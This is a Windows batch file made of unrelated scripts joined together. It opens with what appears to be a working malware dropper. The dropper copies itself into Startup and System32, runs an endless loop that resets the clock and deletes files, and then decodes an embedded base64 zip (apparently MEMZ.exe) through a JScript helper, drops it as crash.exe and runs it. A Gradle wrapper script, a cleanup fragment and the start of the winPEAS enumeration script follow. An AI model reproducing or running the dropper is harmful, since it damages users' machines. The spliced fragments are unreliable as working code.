@echo off
copy %0 %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
cd C:\Windows\System32
copy %0 C:\Windows\System32
xcopy LogonUI.exe crash.bat
chcp 65001
title Ошибка 402 Error 402
xcopy ntoskrnl.exe crash.bat
:crashWinTotal
cd C:\Windows\System32
start dllhost.exe
start winload.exe
start fontdrvhost.exe
copy winload.exe %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
del winload.exe
:winCrash
copy %0
del %0
time 3:00
time 12:00
goto winCrash
goto crashWinTotal
echo UEsDBBQAAAAIAHV36kiQ6IfZcyEAAAA6AAAIAAAATUVNWi5leGXtew10U8e17kg6soUtjACbGGzi>x
echo AxgMyD9Hlm1sY4JkW2AH/wjLP5BgB9k6RhKSjqIfbKcJyBgaqw65tM1NIJckNE1705Tcpi3JJWma>>x
echo OD830Da0TptFSQOpXx7NFSnhmYRbnIRw3jfnyMZpfmCt99b7WauzvM+c2TOz95699+zZIw71t+wl>>x
echo KkIIAxBFQo4QuZjItctJQErWcynk8LTjC44o6o4vaHa6gqw/IGwJ2L1sl93nE0JsJ88Gwj7W5WOr>>x
echo G22sV3Dw+dOnJ2XHaTxj9pZ/yKpcE/Dphr2uz6R3pet3qDdvT3BekurLro+kWuGkdZOry0nHf5Vs>>x
echo VgshdQo1eXHNzrYJ3ChRKpIVKYRo0Vgu4/Jm4aEDsPFV03clIWqikPonahKJK0nqNu2WBtKxk/Vk>>x
echo JZXDKwk5SF82ExJTfImAfogBPnvLCSm9Dl1PFsip+zJ68ZIf4ntDdHnJcYG0V+WeQmJzfsBhD9kJ>>x
echo eXmBjCAL/24BRNKGKV8eRu6jPK1E0g0p/MK44fxAMNBF4mvdHB9X9CX0ArxH6JLXTnUgyVbyhXGV>>x
echo X73Cf5T/naVl6NzAXVpdaDqec0KJ7eLiU6yJxBLQZRxuf1lHWtvcqR1Gsa2tzXlFZyJO6iRtYpoD>>x
echo o9wOMc2EeuC8Ivzn2zrOTtA7l2lrbXPuKjMRMa0I/UPFEfocd94DVJt4wnmQ1kMnxRNGcWhs99uh>>x
echo hbv/Frpxj0W0trkV7tniH/ZYLlrdCZQlvHJYPDHw6tI9lnGre6mY5gElq5hGUO2xxKzOwxLJNA3a>>x
echo GL/Hcuao5Yzkqm1iePyoZYy6mZjGoNuZiK3sThDTRtG4rePWob+0v9Iqpm2mBN3E+cZcLEgNygsw>>x
echo VIdFOitWQOixWME0qOL3l4pHlmM9Rf98zIpxIPk65mH6MVTG4Y6XGbry/nMV4GdrNb7dFm2/+Au6>>x
echo B2xuk5jWi0E2a9QyFpc/9gRoOmMqKhpVoJu4lbFdwA2NH9396meimIuZe6Q3a1vsdtrRPmb8m/j0>>x
echo 68BAVrppxDQ/XRTl4TZFLZdlLlLbKoYvRy3jsWpMhBZsYlouunYPhxVr0COmLUULeDEtRLU4wUaH>>x
echo 0RjzYJs8YGX44l3q2BX0RcMX3Ulnm0RRlIzrsLUOFY/QZb/dZhNPuBXf37Ue9E58f3A9tcllWKdC>>x
echo NtJe6ht3XVbMuPcvMIkzG/oU/YyYxknSzNg9CNvYbDbnzTOhHpvsU3ssjx+1PM6h54VSjD9qeYrA>>x
echo 66zR8Ei0/VC0/XC0/Ui0/flo+3C0/dVo+7Fo++vR9jfFtJNUwyhuh9tB61aQe1Nyvct4/jV1j+Uk>>x
echo BIpJDOjbGXm81Dixe3jHnzFVhT8nGA87HZLr3knnn4y2jw98KoY1bqWY5pQ0TN0oblTqv2WrYstM>>x
echo ZFv6c+nwnKHf6k98i0laO6gwr5TwgQvGX5VNP0dHzPlWf81CExnclXIF6jCvlLCB992EurtEttU2>>x
echo ND+bGucPMATjVv31HphpaJVkrz/C7hFI51bCW+Jy9l6Vc2zgihhOdDNnW0XqIpSkWPw6XNY5tow6>>x
echo KqWY6FafXYHuVhBLMr5tk+Y7TxXK2t8HMmXzTwE19OnQfOqW25a+wFHTbmPEPxiHrdZWp34ebGGV>>x
echo LbV24DXNylV0fOC0U5cDV/vDXy8NFdN98SLdOu6iNmcNavjIwHiCbG2KGy2dwIV7nTTWTyjTSc+h>>x
echo oTFqulK6KdS3uZNskte0Uvnuo970PxTh9/dYDhy1HKigmzwaPgQP2VBGHeUgSJFo+2PR9sclP3n+>>x
echo qOVIkrT7D1DiVHdiGK5STU1/tuCK5M7r17uToE8Sq1XLu1y3QNrlBLvcOVomb3WqmdhSDNj/7DFQ>>x
echo ufRxtOXy25bLp9vHT1vG37Zo5JdTxRvKTeSUmqPPVRHp3YnnOy/FDmIuDTcSQ8RGGszEtKeo3Sza>>x
echo Z/dpQPnSx3v8ytgrDH29MvRJ7Nn424exn+DNrdp/66VPb57xkz+qWi43xQ5InbR9QtUy3iSmHaL6>>x
echo Um6IRzVpm+pasZEPS3EXL+ckH9ljGUNcTHtMYnzZ+Cu95aJTQ4xk/fpW65BlXI9uvIpp6TS2YeCr>>x
echo UpAH2UnhqRtYnffNjR8EcVeIJVMZb9y/8atUM33pFNUMSu+bZdXsZmTVwLsr5lJvPizHjiOUdeGG>>x
echo V3AgkNghlWycVNk4R6x0oAaN2HfQ406ljPcwM+WFZ9smV37SFm0fkxePCLnHcspqk1cfuwXzhurP>>x
echo DLx0YD+V+WKsVkLEJhDjsdKpI4b+FFs6dQAMlK6i/rBBSf0BVpo2pelkyeukzTbUftnW1EoDbfii>>x
echo TVaqTQyPyWqVdHPutOXcqeKaKbrxS++leMa2guJUg2bGT7bYwzTkL98IMdyZOPAGXuasbkV3tCUm>>x
echo pl2ka9uupKLsVVBR9uzMVUz63sC59C91ithVp7g4VD8miW9dT7dF68DwAese8wGru9BdCMfInOIY>>x
echo Uxz/iysw0RX8SElXMMk8deLgaHMniyf2618eGndr3xDl17E3rsRtL51lkmgnpSgm7ROnYgeR9uIw>>x
echo HUJ99TU8L+qPDq0aoxib+MfYN7FSCDU0NqHYXgjxVuzUS6fVVupsH8Ld5kCkoWNDr0F5u38fXu5U>>x
echo gWxTnGrMoqDbahU9x5pipXKDnm1NoG6TTs5X/36ftU5GsGb5HHe4lQhhUihzT8exIaaNS6ddKKM1>>x
echo xoHkRnlMKyrtZDc0u0HKI0wd7S9ryFdlJRzNSmI0Zo9JkWkIvvT4l6QhA3dpVG1Dd+nCZbahrEtV>>x
echo EMUUCeW2xnh4z9B0uiL9utT9kts2SahBCaWjnh/MjNrSO25F9kTFoxp/nqZL7S9rKWWkNn9rG3pn>>x
echo 6MrQaw04ULRDFg1yAN3GjUNjVe6ktXI289d3aaj43j3rpZxjsRMKGnMrEDYoRkzTyrmIxq2QD1Rp>>x
echo 4J76y+vdDIytk2PTYhxTOyaiTutQWIM1bqIHwLhiu9X4+xpb29A4HGXoT7vF7XO7h5jtM/5d29Ed>>x
echo ZTqquqPa7Y0r/3zn+6Cye3j7AnfSbe7pG7vLKlrDuu6yulZleBqGtHZH72xVVq4cufMvt90quejb>>x
echo m7IvD1VnX35FXFxDz9vFddLTKj0HWdP/iWT8/0I5bCLkGGAUMA7QmWX8d/B+wCS/n19FyCcAzU2E>>x
echo pAJYAAdYA3gP+G7UdwDuBzwOeA5wDHACMIL+YcDPAA8D9gJ2AbYBNqDfsUrmcSDO14raBOAA3XGc>>x
echo EnLMAlAjcAAToBlAPesOwN9WE/IYYCfAB9gEqAGUAJYAZgGugFcM9SnACOA5wBhwe1fLPHbFeeUD>>x
echo 6O8hvxhNvPeVe98+wiifVZJnyC8IOT7bMBx9JfpS9OUXCHmRmA71X3k4MVhcEQmqzupI9o7Blw49>>x
echo ceVXkY/F8KWz74qDrx6KvnIo+mH0nf7XiGmij4QvRU+cfVV86pn3qo6odD8nx3UvQpbhh54lR+59>>x
echo 6Qghz44kfvTjFw48AuwZu1b1nv3niqbD33wWY8jm42m39F+JPXIXc+jw2I+v/CbyKQn/99boiSej>>x
echo L0XOZL1XOTj6XuXwB+rhvygH/xr9sKP/k4sPhV95gZhA6ggWc/IIWAxf+c1Zljx16olDT/RfGX4o>>x
echo VNkvHpwRUp09J1IuijgXzOj/5MAjYdVzFx+S+Rz/Ih+Jydmfi+Bw9iWRtDwxMBNFus9rpF8SWFKc>>x
echo PHDhwswLhKwj9zMRkTQ2kkcayfu2nVkXshSVDaTBqpyVNaBDUVoZpVUT0SkNWQOpKMoIM1CNohxk>>x
echo lJGUu00p589/gKJ8lFH+QL3z/PkU5eYblYOagTUoypOMciTlHnL+g9OnTqMcx5/yI2bg9AfnifLn>>x
echo 8we6UVQso2I1qoUp/eS88lO1yswMjCQmjig/ZnadJ7rEROXP5g34UFR+ZuA8iqqXUfk1u0liIhk9>>x
echo r7pJ808gSnp6ehJHRkZGE/GiUs5T9WoG3kdRHWNUw5rdScTfk0hU96qVnzD9p0ZUjzKRHtX7jOo8>>x
echo o2qZN/AECqNjGJ2GmZNEx/ohyMeJqn3qyBhTykT8zEq16odzB76PwmxmBowojJNhNk8fUJHz7ygv>>x
echo MKr7E/t7/MxqhrmHYdbMY5yau8tQPgYwT2kfLOMg6fl35JLih6hy6fErVP86d2A/ipow/fsfUTMJ>>x
echo ajJtEG0syE8UqkFmQIGiXpCg1qtV6oyBb6OorYy6RqfexKhzGLVbrd6YqPYmKo7sI49cSNgfVB/6>>x
echo buKOhMQd63ZemJml/rGoeeIXSuvHqhq1qkEdmamyZar86bvOj0Ig1R6tap+mf5SoHp2vGk5nqpn+>>x
echo 0VHVO0mR06pYDjNz3oAfojL5ScyKpczmzIiKuSuZuXspMzyd+aUuUsb8Npk5maPWabUjWvUNGjWb>>x
echo rF6+WN2ZELmgbktT356oDsxU71yuflJM+KmY+PS/9c+cqfhOIzn1dMrlA2Rdc9LGtFmLk3bpUlBm>>x
echo mZhZJk1Sf1ZkZtKP0maFpw0QuJSWUUdOJT/NJB1XJ71h1io0O0+PjMzaz8z6HpNUkJFcq5utS0nu>>x
echo 0Mx6kImQZA+jakxIDmck75+RvG/G7Hz1rAfV2rZE7U/VyaFMRjdv58GDB1WnmdkDCZHjs6PqyA6t>>x
echo g5n9doLWmaXlZiYHGCZXPbswOdIz+9vqSGIqGrF0bTQttYUZVKEYIc87s95NjEzXOtT9fj+jh/9o>>x
echo n56nTknRnp65K3EUJXWYuRsVnMfvT32dOs1fMvovZM38nVptvSFCUt9kdirQU5qYNludNjsJepnx>>x
echo 7n/OeOu76kPinEUHb/gBo0mv16TeOosVZ2c92Z+YOPu3Nw8chIekZtbtUvn9KmOqtyj10cz+vYmp>>x
echo LxrUtfPTUsT0B0RN2n2pY4kgNidPZHfVJVlv7K82zdNxSQfZeZtv6R8ZWViqTl7ALLiQkWyam1Gb>>x
echo tLAoISMpsf/0+dR0RvVDQ/9ooirKJD+ZkPG9hIxblmTsSO9PSsp8lMl4KDnjRznaggUL30jOuJyt>>x
echo 3XFjhMu8KSmzNidTyIzsXZSekPndfLU1A0Lo3hqPXFhirScPr9154ULWkkcb4HMJo+KCZ/6gqlUv>>x
echo vFetshUnb0hZ9B8a1cPlyY8nL09Sq2Lm5I81i25PZipMi57XMfdwiy5nZt+g1v7bwkhWtml+pCe7>>x
echo Q/vNUTnmay8yy7QZ2XvZ3G+oc7eqs388g5SKeXN35IoNOSv2LXnoQSx+8X/dkiWYklhu7tiNEV2S>>x
echo YJhnYpVjkXmj6dMVTGTzvM+mqe5fnsGlR1JUb92dMZJuvFnN3GVMtc41/gvDHF/GfS9J+0aWOmvx>>x
echo jdHZuZvT1J4czSyRM36W+IKYN0/Mn/tdQ0lyZMxQ8UHy3Jx5o3P7N2+e92lycvfywoPpyY8PGk2Z>>x
echo 2roi4975EaP24azi0dnaEWt2dP70VfNnvCUmPC/OGBR1u8Qlzb9eMPzrec8tWfjUsoxpOctH0itv>>x
echo Tpi9fafen56aXqofnrtrGkpZ5k2Nqb80qq2Z2T9Ki1xIWyjOWS/eYBXT68WSO39vJqJZfDLjQFHl>>x
echo aHqEyzi7oopL3zXN759WVlVvzdxjrBqZX3VeS62Q/VzjmpY3blwpKm5dQZ1jmdjIReaO/Xrht5bM>>x
echo G1228K2ccv8Ni26IrtSxi4Y5496s7Bn96/ZnrPslU61Qm3YlrHu9psA6svrdh0z9TIFCpHv4E9Ea>>x
echo Obt8Y045u2T5D5eX+xct/+iupkiu0bMysropptPHcmxZcyIf36pkcpcX2wQIf6tFHbmQ+w2D5max>>x
echo be8Dm95obF/YePf2nFk5dWuOVLcPq+9dciS7KPvFRUXZZPGR6ro17cOa9jfVB4GLLnpxURT4ujUP>>x
echo WbbnbM/x147lOJf6l/ldzpqxte1XEu52Lt2eU7fkocUds5gOHdORwuz2L9u+tm5NxxztwBhmdCRp>>x
echo +sfWdqRoOtYwHRXqXTX+WmdN+8Xu3f7a/bll+o7hhI4nEgb8y2bltB9L6PfXdrym6d+f2/Em0/EM>>x
echo c/f+3E/zs/PRHE7peF1zG2E6/sZgLFl+mzah4/fafnJzx7DneWfNRiEcYLsErz8c4gOs0x5kO3ne>>x
echo x4YC9qCTd7CdfWzIybP1lvpbgBPcdl8+2yD0sLzPLdz2fMK3GvrsPrbKHsrPzy/A3eNgIu4fjS1N>>x
echo bFVjvbWl2dLE1phtbKXF0sCuaalaZ6lmKzeyzTUWmWBzU+PN5ob86UnTkz4vRo/gywmxnYIQYsN+>>x
echo 1r7F7vLlTk8KCmw4yLOuEAspPYJvC637hDD9Z6AFlEh5NX02B/pc6AsJ7FaXxyNz6qFvXXY6vY9y>>x
echo CvYFQ7yXjunkpyc5+CDW1oflunzBkN0X8vTlsuDmkMQIBfooz/Jq7OM/AeYBnKGQv7ygYIsgbPHw>>x
echo +V1CftfWgiBvD3Q5V9++qhPk9D32Pn1I0FMR9JRlkPd0X2OeU+jRF+oDvFfYxuvt+m2uQDh4LV7e>>x
echo Lns3z+u3BfU+IRASfNcaT3lArCDvc0ywoG1vn7474ALymvxcPr4rYO8O6Z32Xr1D6PF5BLsDzCfF>>x
echo vS7+W/iQ3iv4+L5r6lLw3eHSd4Ydjr6r3LoDPH9duuwM9+l7eN5BrleuLsExqXq9y4eXYNju0Xfa>>x
echo g66uifvM19Lpcdqpavx+3gcC3dT0egfv4UO8XvY5Y+E1aWwxhvQB49bQNXVjD3U547JO6OZac6TR>>x
echo +XzvtfTn8mEf+mAlvtfvEQJ8QO+Cozh5veTcnQGhJ8gHrkMf3fYuHvt4K3TStRXbEkoWPJIBv+g8>>x
echo +h4hII0p5Awl17MO2NflcUA2D7/FFfo81eu0d4C3wzR0g+oxUR+w+4KCt8ceuB7/wvz4ZvXy3jv0>>x
echo cni8zn2ADTcR7ahmHQJddw/vCjigZbxDGaFu2iP7ElzR77kDDY//6+k67L6tkjjXJ/+kDeQp15hj>>x
echo 93TrPa5uXm/Ewj28PQh1Q33XmodVIAqGETrsIRdm2j3X9hsEh5B9C6/32wMCtr7XLjlG/N/9ZQf5>>x
echo 2vnUVSWrwJRxll87nob9rQgx0tNr78Nf8Hr2u1tw+vRdvM+u97ocrrgj+oQQrOvbxgdCiD3X8GMf>>x
echo H7SHuyRpeczyePiukIsG8q+Xd2sAOuV79cEuHDQCji04ErzP5wKpoD/gCvFBSaRJOvDsHj4QzPe6>>x
echo ugJCUOgOgaS3gPflhYMF0GsIbAu6hUDYO9G6TYASA3kTrSD92AJGKKBqzfPaPXSXSM6eJ3t+HnVo>>x
echo Guk8fXnxE5UOLywp7ewydBXmGcu6i/KKCrtL88o4NIvLVthLVhg7SzqLiqfq2Sux7RTsAUf+NqxG>>x
echo EhMWdBT00HiXh+0RnGCfFwoHfHn2vImtlIewJaDtcMEMdk+ek/d4ILefn0Lf77H35Xd5wp3YVlvC>>x
echo Lh+lP9nXJfhDLq/rDj6AZUs9k/OoygSoV8J22T3SeQBL834Emy6vg/RQpQMX4LfwDleITEROOi5k>>x
echo D271bgkQbxB+0e3aQnHeoB95TYg4+G3eLd5QPvoIeqE3D/F6u2gexa6rratD0lS/MZ4rIc2h2RdN>>x
echo erB8dosQz3QcLp7+rESaLLZmtraBtdbabLnsmsYmSytysHq08kkt22ZuagA1EEa6RmrMNWa2geMq>>x
echo 2bpCK7vW2Mw2Gdc1I38D8W67y4N0yB6S0yWD0biCdRb1csicaEZzB2VG5WtuqgVBWyPSvKZq1txQ>>x
echo za5tbKbtNeamXLayRRKG5nuWhupcVsoMrVWQw8bamrG0eFK4ALKgbsLqLA03N25kK7FSstbSjMyx>>x
echo WU4iN7ANlg3NbHNtvYXtrcb4Vgsmg3bTxtqGtWxzI0uXjvXKTKrNzWaasd25qeBOI33g1K20NVZD>>x
echo HGSmmAH5W2ubWmystcncsI5duraxwcK2NTU2rF1G9SiLQQVv2GhuYKvM0MtaPsTS+MAiQXRJjs96>>x
echo yxbI+qLGQCKM/SaEsAoo9gt/ZFG9fStfLzvuWnrumGleS4itsd5S2Vi9kW1sqLJgJXWwt+VqkmzG>>x
echo miBdg5ltaoTG6i0TeUibsw92d0jOwG+TcnYXbDY1710dT6yhc1eQ7Q53baVG9fUhOc0nNr4rHOAr>>x
echo aZIdRE+Q2nRLoJT1lrIuFnVpQSmpsW+TMuYJ2thu1OOQDgvd3aDkYAWfnJ+vJhW1PuQEIfZmgfew>>x
echo t4exM1hsZP4mKivWy4fosUbFs0O6tWaXmUUk6URIWhBfDzZrLku3rEDvHAE+n62Np+CdvMeFJbI9>>x
echo fA6e0gUF+9PPBzxIzemOcSCCOjA+x8tW0oyRksyRPhXDH2YG+qRTFQR7YD36pZi3b/K6kTM9ic2j>>x
echo phWErpCBlbMPzG9x5rJVCBSsNR4p2GaXl6crQPrKdiIc8o4FXz7ZJuV6NXaaUMvv68MIiVJcl9uW>>x
echo 3i6P3WuXUaSA9BA7CZEu4iQOIhAaIJBgE2rECXs34x5GgxD1H8km7nAwxCKV68IiHHShiB5BF/Ih>>x
echo tOIBEncrSQvxpnwPctoDXnlfT164qCVxxvJBatqwLxy0d3ro5NruyVgT5Hkp2Ejk+GAQpzPIhZxC>>x
echo OMRu9Qk9tJNmv18UDXcpF06GPtgM83B9lNghdEomiYtEs5yrDClBmVpoqvgOARLSybQRDtLpdjaI>>x
echo GxDuo9iRgs/Lw7owEE6/UG6c30Ze8jqc8HBOV0i6blY30jiBQNTQTGOHZYOlCrdVbLpaG1tvrkOg>>x
echo tOTSiNJS10zDC4IYokBLQ4vNXFmHfWmuqqltsMR/15cm4Y/u2Doz4i8Ns5glXUkpsqrJYkZoomMa>>x
echo EB1B1trYYKullBChQXkj4lW9eS0lXG1hW2xSRJsiCijJ4XJCztrm1dRnvPAZF6H+s2lT/iarsw+3>>x
echo FLunOuDaxnPA0cMpPyR9q+cLOTw062oKecwOahwrBiHEb8GB1RBqsruCfA0OXEsgIEjnlY3wACcJ>>x
echo wyepP/aAi5UEwG0bwIPeLYSedfTrB+xDKgKwAvFIc0PSGA9hMT8oSbgF7yHQc6HNwssFyO6XqPOg>>x
echo uppcLcPxxli81pjkWhevU+N1drzOj9dF8XpjvHbJtWmHXPsfiLcfkeqJbzanA84BjpUD4t9rTvSl>>x
echo kM+XtVXNdfRfHeh3j9I3kNlead0T30vmu+iHjNlSMqNDADoyF7j4N5CUPuUjt7PvuOMORyfd4/Qb>>x
echo znvI5FzpbmiqwCqv4oySj1V8jof01SP9d60OZhInf+FoJWQXHRf/pnLXevmTy/zOoJzObpY/nZS+>>x
echo pczmDBIKiEHFJE6Sobfi6rrfRQTPxhrHp+C+CS0+BpxnCu4J4NJZWdaJstAs6+fMFFwvcHuB27Tq>>x
echo Ku47wGmgs1NTxh0BbpAlX1r+8W+KMo+Jf1O0KJGdWANCl9nhoEGPkGpVnYBgYPZI38LWyK019IeT>>x
echo iKoRO5YOpgOHFZhZFQ4EEDkncHMVll7XZOtpUiXdkpudNAsn5D+mzJBxtcD+jLF5eN5PFqvbaB68>>x
echo BsGFNJEqj0Aji8+BllntwaWgy+uHzJUT79hpFZDN7qhzdQbsgT70pdK11ONI90hUGuxeHqPulrgK>>x
echo Xi+I1eHS1EYG43LRQWZyF2OjGnAJ4N5X5bFTHbwwIbkgeJBX+I2FNp/dH3QKCIn3q+LrMxaucQWC>>x
echo oTay7yqmAbsbPH+uXOsROieU+Fy8JSmRNEgr8PA+jEPq2mCpMxbmS0G2nUpaL5+QbeSyspn+qOCB>>x
echo GHEcIT8h1S4k/7jNTA4j/0WozttcPlzJg5ZecoBU891yk4qFEXXKJtwu6UVPWp6F7iNvfIXyQIra>>x
echo TrnLKUY9j6ytC3pIUcb5VAoY8TslNBVnVCMIWy29IK5q8Tnx/jk0+QZG+hzxuTT3wVnfRrZJ2Fof>>x
echo MgdylFQH7D21XTSJ+Q7lLBOoriI8pJV+IsD7gas9TbhKkrQp8rSRb1F54E9BIWAVIC0b96+J9iLa>>x
echo ruaDW0OCXyZCyJ+JxRf2VjldHkdcZEIySRUyS2q6uPjkAwX1LCpdG2mxWZomLDSbVLpClZ4QtbAt>>x
echo FOBhCKm1tro2PuSSYsoeaRa20hMui8hHp9ScPD+D5AFwEbaG/ZOoVrsnDJP+FLbp84fMXbeHXQG+>>x
echo Cjc72atekvFreV8TfJleMc3VrWbrBGtyo8JGk2CLnD2ZycLPtdtIApmyDZoFc2DLNlBd8LlR1Ka2>>x
echo GkvdhFNqiBXXXpsQ9jngNW21DfX1En42iccNLLPWC4tM7DiMstogVH51Xd2Xh+DrLm8uNxGt3kRM>>x
echo AD/gKcAYgM01kQ2AQcAIIDXPRCoAfsA+wCigFMd7L+AIYBxgLUAbcAhwBpCOwLoBMAgYpkHWgDmA>>x
echo CGBpIfCAxwDDgDcB9EvUM4AYYAwwDmCMkA+QDmABuYAiwMUS0FthIroV8oFSCpwHMAjYB3gKcBKQ>>x
echo jdSjFNAMuBMwCNgHOAw4BhgFaIpBG7ABsA9wCPA8IAZgwGcpoBdwBHAZKQ4Xxt5Ok+sf3IC5DYQc>>x
echo nIP1vwJ9xvHL58j47nTImIOzEm3TAULOYvzm9wk5jva+cjLxv0v+HykKko5nuvy/XT6Hp3JyX4Kf>>x
echo hhynhlzNU/6+VKzu9XpY3PGCuEutyjHkczm4DnQJDlwPVuW0NK/JK82h2b/PYfcIPn5VTh8fzFl9>>x
echo 0/SkCkRR3EBxMQEBX3BVDm635cEuJ++1B/MmfyajPy6V24Pe/G2GHFxEfK5u3C1ap3IDKZatCAUQ>>x
echo G2p93UKc2sJrUDMulOZhZpBexHFqxdvABPjb6XWRd1wNM5OdU7vl3Q5B6nDH9bAe+lyVQ7sRccwO>>x
echo r8uH8yJgDwmBHDbsMnfRbb4qp9vuCfI5bMFVfgVfzbCi4HPiVRRMrpNqsGBChWh8pcmRgG6A3WZx>>x
echo uVwpZ+Ju4TZz3ZyXC3NPcf/ODXNHufe4jziFYZphpiHDsNxgMJQZTAbe4Df0G35h+I3hPcNFw2eG>>x
echo tMIVhdWF6wpbCjcVbi0MFe4qvKfwXwofLTxa+Hbhfyv8oPBSYZoxw5hnLDdWG9cZNxm7jT7jncZv>>x
echo Gx8z/tL4ivG08V3jZ0ZlUVKRrii9KKsov6ikyFS0vqi1qKMoUHR30f1F3yt6oujVojNFHxbpim8o>>x
echo zizOLq4rbireUNxR/I3i14rfKf7P4ovFaSXzS4pLzCVbSrwlwZK+kqGSb5fsK3my5HDJcyUnS86U>>x
echo fFjiXhFaMbAiuuKfVvzzit+u+GjF5RXTSvNLS0otpetK15e2lfpL95Q+UPr90qdKXy49VfpeaULZ>>x
echo 7DK2LL+stqyzrL9ssOyBskfK/rXsp2XPlA2XHS37sExdvrC8sfyWck95oHx7+UD53vIfl6eunLeS>>x
echo XblkJc31D1P9cgyn4bScjkvl0rlMjuWyuaXQNccVQd8V0Hg1V8PVcVaumdvAbYL2HZyT83B+LsT1>>x
echo cndyEW4XN8jdw+3l7uP2cQe4g9xj3OPcIVjnMHeEex4WOsa9zo1wb3InuVPcKHeGi3HnuDHuIjfO>>x
echo XeaIgTFoDFqDzpBqSDdkGlhDtmGpIdfAGRCHDTUGq2GDYbPBCWv2Gv4XwsY/yv+35X8CUEsBAhQA>>x
echo FAAAAAgAdXfqSJDoh9lzIQAAADoAAAgAAAAAAAAAAAAAAP+BAAAAAE1FTVouZXhlUEsFBgAAAAAB>>x
echo AAEANgAAAJkhAAAAAA==>>x
echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js

set v="%appdata%\crash.exe"
del %v% >NUL 2>NUL
cscript x.js >NUL 2>NUL
del x.js >NUL 2>NUL
del z.zip >NUL 2>NUL
del x >NUL 2>NUL
start "" %v%
@if "%DEBUG%" == "" @echo off
@rem ##########################################################################
@rem
@rem  Gradle startup script for Windows
@rem
@rem ##########################################################################

@rem Set local scope for the variables with windows NT shell
if "%OS%"=="Windows_NT" setlocal

@rem Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
set DEFAULT_JVM_OPTS=

set DIRNAME=%~dp0
if "%DIRNAME%" == "" set DIRNAME=.
set APP_BASE_NAME=%~n0
set APP_HOME=%DIRNAME%

@rem Find java.exe
if defined JAVA_HOME goto findJavaFromJavaHome

set JAVA_EXE=java.exe
%JAVA_EXE% -version >NUL 2>&1
if "%ERRORLEVEL%" == "0" goto init

echo.
echo ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:findJavaFromJavaHome
set JAVA_HOME=%JAVA_HOME:"=%
set JAVA_EXE=%JAVA_HOME%/bin/java.exe

if exist "%JAVA_EXE%" goto init

echo.
echo ERROR: JAVA_HOME is set to an invalid directory: %JAVA_HOME%
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:init
@rem Get command-line arguments, handling Windowz variants

if not "%OS%" == "Windows_NT" goto win9xME_args
if "%@eval[2+2]" == "4" goto 4NT_args

:win9xME_args
@rem Slurp the command line arguments.
set CMD_LINE_ARGS=
set _SKIP=2

:win9xME_args_slurp
if "x%~1" == "x" goto execute

set CMD_LINE_ARGS=%*
goto execute

:4NT_args
@rem Get arguments from the 4NT Shell from JP Software
set CMD_LINE_ARGS=%$

:execute
@rem Setup the command line

set CLASSPATH=%APP_HOME%\gradle\wrapper\gradle-wrapper.jar

@rem Execute Gradle
"%JAVA_EXE%" %DEFAULT_JVM_OPTS% %JAVA_OPTS% %GRADLE_OPTS% "-Dorg.gradle.appname=%APP_BASE_NAME%" -classpath "%CLASSPATH%" org.gradle.wrapper.GradleWrapperMain %CMD_LINE_ARGS%

:end
@rem End local scope for the variables with windows NT shell
if "%ERRORLEVEL%"=="0" goto mainEnd

:fail
rem Set variable GRADLE_EXIT_CONSOLE if you need the _script_ return code instead of
rem the _cmd.exe /c_ return code!
if  not "" == "%GRADLE_EXIT_CONSOLE%" exit 1
exit /b 1

:mainEnd
if "%OS%"=="Windows_NT" endlocal

:omega
echo %1
start powershell -noexit -NoProfile -ExecutionPolicy RemoteSigned "%sublime_terminal_path%\PS.ps1" %1
rmdir /s /q "ManagedDoom\bin"
rmdir /s /q "ManagedDoom\obj"
rmdir /s /q "ManagedDoomTest\bin"
rmdir /s /q "ManagedDoomTest\obj"
rmdir /s /q "TestResults"
set long=no


echo             *((,.,/((((((((((((((((((((/,  */               
echo      ,/*,..*(((((((((((((((((((((((((((((((((,           
echo    ,*/((((((((((((((((((/,  .*//((//**, .*((((((*       
echo    ((((((((((((((((* *****,,,/########## .(* ,((((((   
echo    (((((((((((/* ******************/####### .(. ((((((
echo    ((((((..******************/@@@@@/***/######* /((((((
echo    ,,..**********************@@@@@@@@@@(***,#### ../(((((
echo    , ,**********************#@@@@@#@@@@*********##((/ /((((
echo    ..(((##########*********/#@@@@@@@@@/*************,,..((((
echo    .(((################(/******/@@@@@#****************.. /((
echo    .((########################(/************************..*(
echo    .((#############################(/********************.,(
echo    .((##################################(/***************..(
echo    .((######################################(************..(
echo    .((######(,.***.,(###################(..***(/*********..(
echo   .((######*(#####((##################((######/(********..(
echo    .((##################(/**********(################(**...(
echo    .(((####################/*******(###################.((((  
echo    .(((((############################################/  /((
echo    ..(((((#########################################(..(((((.
echo    ....(((((#####################################( .((((((.
echo    ......(((((#################################( .(((((((.
echo    (((((((((. ,(############################(../(((((((((.
echo        (((((((((/,  ,####################(/..((((((((((.
echo              (((((((((/,.  ,*//////*,. ./(((((((((((.
echo                 (((((((((((((((((((((((((((/"
echo                        by carlospolop
echo
echo Advisory: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
echo
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [*] BASIC SYSTEM INFO ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-^> [+] WINDOWS OS ^<_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
echo [i] Check for vulnerabilities for the OS version with the applied patches
echo   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
systeminfo
echo.
wmic qfe get Caption,Description,HotFixID,InstalledOn | more
echo.
echo.
set expl=no
